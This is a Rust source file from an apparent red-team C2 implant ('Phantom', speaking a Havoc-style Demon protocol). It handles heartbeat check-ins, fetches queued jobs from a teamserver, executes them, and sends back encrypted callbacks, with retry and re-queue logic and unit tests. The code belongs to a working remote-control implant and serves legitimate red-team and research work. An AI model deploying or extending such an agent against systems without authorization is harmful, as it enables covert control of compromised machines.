//! Pending callback queue management and checkin dispatch.

use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage};
use tracing::warn;

use super::PhantomAgent;
use crate::command::{PendingCallback, execute};
use crate::error::PhantomError;
use crate::protocol::{build_callback_packet, callback_ctr_blocks};

/// Build a [`DemonPackage`] for each callback in order (single ECDH `DemonMessage` batch).
fn demon_packages_for_callbacks(
    callbacks: Vec<PendingCallback>,
) -> Result<Vec<DemonPackage>, PhantomError> {
    let mut out = Vec::with_capacity(callbacks.len());
    for callback in callbacks {
        let payload = callback.payload()?;
        out.push(DemonPackage {
            command_id: callback.command_id(),
            request_id: callback.request_id(),
            payload,
        });
    }
    Ok(out)
}

/// Returns whether `callbacks` includes an Exit reply (only meaningful after the batch was sent successfully).
///
/// Mirrors non-ECDH [`PhantomAgent::checkin`], which sets exit only per successful `send_packet`.
/// Regression: red-cell-c2-heloe — `exit_requested` must not be set when ECDH batch send fails.
fn batch_contains_exit_callback(callbacks: &[PendingCallback]) -> bool {
    callbacks.iter().any(|c| matches!(c, PendingCallback::Exit { .. }))
}

impl PhantomAgent {
    /// Send a `COMMAND_CHECKIN` heartbeat, then fetch and dispatch queued tasks
    /// with a separate `COMMAND_GET_JOB` request.
    ///
    /// When an ECDH session is active, this sends a single combined session packet
    /// containing both `CommandCheckin` and `CommandGetJob`, then sends each task’s
    /// callback batch as one ECDH session packet (one `seq` + one `DemonMessage`
    /// that may contain several packages, e.g. `CommandProc` + `CommandOutput`).
    ///
    /// Without ECDH, mirrors Specter's two-request pattern: the teamserver's
    /// `handle_checkin` returns no task bytes, so tasks must be fetched via a
    /// follow-up `CommandGetJob` call.
    pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
        self.state.poll().await?;

        if self.ecdh_session.is_some() {
            return self.ecdh_checkin().await;
        }

        self.flush_pending_callbacks().await?;

        // Send COMMAND_CHECKIN heartbeat; the server always returns an empty body.
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            u32::from(DemonCommand::CommandCheckin),
            0,
            &[],
        )?;
        let _response = self.transport.send(&packet).await?;
        self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandCheckin), 0);
        self.callback_seq += 1;

        // Fetch queued tasks with a separate COMMAND_GET_JOB request.
        let packages = self.get_job().await?;

        let mut exit_requested = false;
        for package in packages {
            execute(&package, &mut self.config, &mut self.state).await?;
            let mut callbacks = self.state.drain_callbacks();
            let mut idx = 0;
            while idx < callbacks.len() {
                let callback = &callbacks[idx];
                let payload = callback.payload()?;
                let packet = build_callback_packet(
                    self.agent_id,
                    &self.session_crypto,
                    self.ctr_offset,
                    self.callback_seq,
                    callback.command_id(),
                    callback.request_id(),
                    &payload,
                )?;
                match self.send_packet(packet).await {
                    Ok(()) => {
                        self.ctr_offset +=
                            callback_ctr_blocks(callback.command_id(), payload.len());
                        self.callback_seq += 1;
                        if matches!(callback, PendingCallback::Exit { .. }) {
                            exit_requested = true;
                        }
                        idx += 1;
                    }
                    Err(e) => {
                        warn!(
                            error = %e,
                            "failed to send callback; re-queuing remaining — continuing remaining job packages"
                        );
                        let tail = callbacks.split_off(idx);
                        self.state.requeue_callbacks_front(tail);
                        break;
                    }
                }
            }
        }

        Ok(exit_requested)
    }

    /// ECDH-mode checkin: combines checkin + get_job into one encrypted session packet.
    async fn ecdh_checkin(&mut self) -> Result<bool, PhantomError> {
        // First flush any pending callbacks as a batched ECDH session packet.
        self.ecdh_flush_pending_callbacks().await?;

        // Send [CommandCheckin, CommandGetJob] in one session packet.
        let packages = vec![
            DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
            DemonPackage::new(DemonCommand::CommandGetJob, 0, Vec::new()),
        ];
        let response = self.ecdh_send_packages(packages).await?;

        // Response is DemonMessage bytes containing job packages (if any).
        if response.is_empty() {
            return Ok(false);
        }
        let job_message = DemonMessage::from_bytes(&response)
            .map_err(|e| PhantomError::Transport(format!("ECDH job parse: {e}")))?;

        let mut exit_requested = false;
        for package in job_message.packages {
            execute(&package, &mut self.config, &mut self.state).await?;
            let callbacks = self.state.drain_callbacks();
            if callbacks.is_empty() {
                continue;
            }
            // Keep a copy so we can restore the queue if batching or transport fails.
            let recovery = callbacks.clone();
            let pkgs = match demon_packages_for_callbacks(callbacks) {
                Ok(p) => p,
                Err(e) => {
                    self.state.requeue_callbacks_front(recovery);
                    return Err(e);
                }
            };
            match self.ecdh_send_packages(pkgs).await {
                Ok(_) => {
                    // Mirror non-ECDH `checkin`: Exit is only acknowledged after the callback
                    // reaches the teamserver (red-cell-c2-heloe / dz867).
                    if batch_contains_exit_callback(&recovery) {
                        exit_requested = true;
                    }
                }
                Err(e) => {
                    // Do not abort the rest of this job message: the teamserver has already
                    // dequeued every package in the batch. Returning early would leave later
                    // tasks never executed (e.g. CommandFs upload after CommandMemFile chunks)
                    // while callbacks sit un-flushed until a later check-in — the classic
                    // scenario-06 symptom ("queue accepted, file never appears").
                    warn!(
                        error = %e,
                        "ecdh: failed to send callback batch; re-queuing callbacks — continuing remaining job packages"
                    );
                    self.state.requeue_callbacks_front(recovery);
                }
            }
        }

        Ok(exit_requested)
    }

    /// Flush pending callbacks over ECDH (one session packet; one `DemonMessage` for the batch).
    ///
    /// On **transport** failure the callbacks are restored and `Ok` is returned so
    /// [`Self::ecdh_checkin`] can still send `[CommandCheckin, CommandGetJob]` in the same
    /// cycle. Returning `Err` here would suppress job polling indefinitely while the queue is
    /// non-empty, which strands multi-part tasks such as upload MemFile chunks + `CommandFs`.
    ///
    /// Callback encoding failures still propagate: they are not recoverable by retrying send.
    async fn ecdh_flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        let callbacks = self.state.drain_callbacks();
        if callbacks.is_empty() {
            return Ok(());
        }
        let recovery = callbacks.clone();
        let pkgs = match demon_packages_for_callbacks(callbacks) {
            Ok(p) => p,
            Err(e) => {
                self.state.requeue_callbacks_front(recovery);
                return Err(e);
            }
        };
        if let Err(e) = self.ecdh_send_packages(pkgs).await {
            warn!(error = %e, "ecdh: failed to flush pending callbacks; re-queuing callbacks");
            self.state.requeue_callbacks_front(recovery);
        }
        Ok(())
    }

    pub(super) async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        if self.ecdh_session.is_some() {
            return self.ecdh_flush_pending_callbacks().await;
        }
        for callback in self.state.drain_callbacks() {
            let payload = callback.payload()?;
            let packet = build_callback_packet(
                self.agent_id,
                &self.session_crypto,
                self.ctr_offset,
                self.callback_seq,
                callback.command_id(),
                callback.request_id(),
                &payload,
            )?;
            self.send_packet(packet).await?;
            self.ctr_offset += callback_ctr_blocks(callback.command_id(), payload.len());
            self.callback_seq += 1;
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use red_cell_common::demon::DemonCommand;

    use super::{batch_contains_exit_callback, demon_packages_for_callbacks};
    use crate::command::PendingCallback;

    #[test]
    fn batch_contains_exit_callback_true_when_exit_present() {
        assert!(batch_contains_exit_callback(&[PendingCallback::Exit {
            request_id: 1,
            exit_method: 0,
        }]));
    }

    #[test]
    fn batch_contains_exit_callback_false_without_exit() {
        assert!(!batch_contains_exit_callback(&[PendingCallback::Output {
            request_id: 2,
            text: String::new(),
        }]));
    }

    #[test]
    fn callback_batch_bundles_proc_then_output_in_order() {
        let callbacks = vec![
            PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id: 7,
                payload: vec![0xab, 0xcd],
            },
            PendingCallback::Output { request_id: 7, text: "batch-out".to_string() },
        ];
        let pkgs = demon_packages_for_callbacks(callbacks).expect("packages");
        assert_eq!(pkgs.len(), 2);
        assert_eq!(pkgs[0].command_id, u32::from(DemonCommand::CommandProc));
        assert_eq!(pkgs[1].command_id, u32::from(DemonCommand::CommandOutput));
    }
}
